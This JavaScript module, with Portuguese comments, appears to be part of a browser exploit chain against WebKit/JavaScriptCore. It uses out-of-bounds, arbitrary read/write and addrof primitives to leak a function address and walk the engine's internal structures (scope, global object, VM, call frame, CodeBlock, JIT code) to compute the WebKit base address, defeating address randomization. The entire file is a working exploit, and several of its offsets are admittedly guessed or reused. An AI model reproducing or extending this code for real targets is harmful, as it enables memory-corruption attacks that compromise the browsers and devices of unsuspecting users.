// js/script3/testArrayBufferVictimCrash.mjs (v96 - Definitivo com Cadeia de Vazamento Completa)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    arb_read,
    arb_write,
    attemptAddrofUsingCoreHeisenbug, // Usando a primitiva addrof original
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK = "Exploit_Final_R54_Full_Chain";

function isValidPointer(ptr, context = "") {
    if (!ptr || !isAdvancedInt64Object(ptr)) return false;
    if (ptr.high() === 0 && ptr.low() < 0x10000) return false;
    if ((ptr.high() & 0x7FF00000) === 0x7FF00000 && ptr.high() !== 0) return false;
    logS3(`[isValidPointer] Ponteiro Válido em '${context}': ${ptr.toString(true)}`, "debug");
    return true;
}

// --- Função Principal do Exploit ---
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_TEST_BASE = FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK;
    logS3(`--- Iniciando ${FNAME_TEST_BASE}: Exploit Funcional (R54 Cadeia Completa) ---`, "test");
    document.title = `${FNAME_TEST_BASE} R54 Init...`;

    try {
        // A função de bootstrap agora executa toda a cadeia de vazamento.
        const webkit_base = await run_full_leak_chain();
        
        logS3(`CADEIA DE EXPLORAÇÃO CONCLUÍDA COM SUCESSO!`, "good", FNAME_TEST_BASE);
        logS3(`==> Base do WebKit Encontrada: ${webkit_base.toString(true)} <==`, "vuln", FNAME_TEST_BASE);
        document.title = `SUCESSO! Base: ${webkit_base.toString(true)}`;
        
        return { success: true, webkit_base: webkit_base.toString(true) };

    } catch (e) {
        logS3(`ERRO CRÍTICO NA CADEIA DE EXPLORAÇÃO: ${e.message}`, "critical", FNAME_TEST_BASE);
        console.error(e);
        document.title = `${FNAME_TEST_BASE} - FAIL`;
        return { success: false, error: e.message };
    }
}


async function run_full_leak_chain() {
    // Etapa 1: Preparar o ambiente OOB para as primitivas arb_read/arb_write
    await triggerOOB_primitive({ force_reinit: true });

    // Etapa 2: Usar a primitiva addrof original para obter o primeiro endereço.
    logS3("--- Etapa 1: Vazamento de Endereço Inicial com Heisenbug Addrof ---", "subtest");
    const targetFunctionForLeak = function someUniqueLeakFunctionR54_Instance() { return 1; };
    const leak_result = await attemptAddrofUsingCoreHeisenbug(targetFunctionForLeak);

    if (!leak_result || !leak_result.success) {
        throw new Error(`A primitiva addrof inicial falhou: ${leak_result.message}`);
    }
    const leaked_func_addr = new AdvancedInt64(leak_result.leaked_address_as_int64);
    if (!isValidPointer(leaked_func_addr, "leaked_func_addr")) throw new Error("Endereço da função vazado é inválido.");
    logS3(`Endereço da função vazado: ${leaked_func_addr.toString(true)}`, "leak");

    // Etapa 3: Navegar pelas estruturas internas para encontrar a VM
    logS3("--- Etapa 2: Navegando Estruturas JSC para encontrar a VM ---", "subtest");

    // JSFunction -> JSScope
    const scope_offset = JSC_OFFSETS.JSFunction.SCOPE_OFFSET;
    const scope_ptr = await arb_read(leaked_func_addr.add(scope_offset), 8);
    if (!isValidPointer(scope_ptr, "scope_ptr")) throw new Error("Ponteiro para JSScope é inválido.");
    logS3(`JSScope @ ${scope_ptr.toString(true)} (offset +0x${scope_offset.toString(16)})`, "leak");
    
    // JSScope -> JSGlobalObject
    const GLOBAL_OBJ_IN_SCOPE_OFFSET = 0x10; // Offset padrão
    const global_obj_ptr = await arb_read(scope_ptr.add(GLOBAL_OBJ_IN_SCOPE_OFFSET), 8);
    if (!isValidPointer(global_obj_ptr, "global_obj_ptr")) throw new Error("Ponteiro para JSGlobalObject é inválido.");
    logS3(`JSGlobalObject @ ${global_obj_ptr.toString(true)} (offset +0x${GLOBAL_OBJ_IN_SCOPE_OFFSET.toString(16)})`, "leak");

    // JSGlobalObject -> VM
    const vm_offset = JSC_OFFSETS.JSCallee.GLOBAL_OBJECT_OFFSET; // Reutilizando offset
    const vm_ptr = await arb_read(global_obj_ptr.add(vm_offset), 8);
    if (!isValidPointer(vm_ptr, "vm_ptr")) throw new Error("Ponteiro para VM é inválido.");
    logS3(`VM @ ${vm_ptr.toString(true)} (offset +0x${vm_offset.toString(16)})`, "leak");

    // Etapa 4: Atacar o CallFrame para obter o ponteiro JIT
    logS3("--- Etapa 3: Lendo o Call Frame para vazar o ponteiro JIT ---", "subtest");
    
    // VM -> Top Call Frame
    const top_call_frame_ptr = await arb_read(vm_ptr.add(JSC_OFFSETS.VM.TOP_CALL_FRAME_OFFSET), 8);
    if (!isValidPointer(top_call_frame_ptr, "top_call_frame_ptr")) throw new Error("Ponteiro para Top Call Frame é inválido.");
    logS3(`Top Call Frame @ ${top_call_frame_ptr.toString(true)}`, "leak");

    // Call Frame -> Callee (verificação)
    const callee_offset = 0x8; // Do CallFrame.txt
    const callee_ptr = await arb_read(top_call_frame_ptr.add(callee_offset), 8);
    logS3(`Verificação: Callee @ ${callee_ptr.toString(true)} (deve ser próximo ao endereço da função vazado)`, "leak");
    
    // Call Frame -> CodeBlock
    const codeblock_offset = 0x0; // Do CallFrame.txt
    const codeblock_ptr = await arb_read(top_call_frame_ptr.add(codeblock_offset), 8);
    if (!isValidPointer(codeblock_ptr, "codeblock_ptr")) throw new Error("Ponteiro para CodeBlock é inválido.");
    logS3(`CodeBlock @ ${codeblock_ptr.toString(true)}`, "leak");

    // O ponteiro para o código JIT geralmente está dentro do CodeBlock.
    // O offset para o JITCode pode variar, mas um candidato comum é 0x18.
    const JIT_CODE_IN_CODEBLOCK_OFFSET = JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET; // Reutilizando offset comum
    const jit_code_ptr = await arb_read(codeblock_ptr.add(JIT_CODE_IN_CODEBLOCK_OFFSET), 8);
    if (!isValidPointer(jit_code_ptr, "jit_code_ptr")) throw new Error("Ponteiro para JIT Code é inválido.");
    logS3(`Ponteiro JIT Code: ${jit_code_ptr.toString(true)}`, "leak");

    // Etapa Final: Calcular a base
    const webkit_base = jit_code_ptr.and(new AdvancedInt64(0x0, ~0xFFF));
    return webkit_base;
}
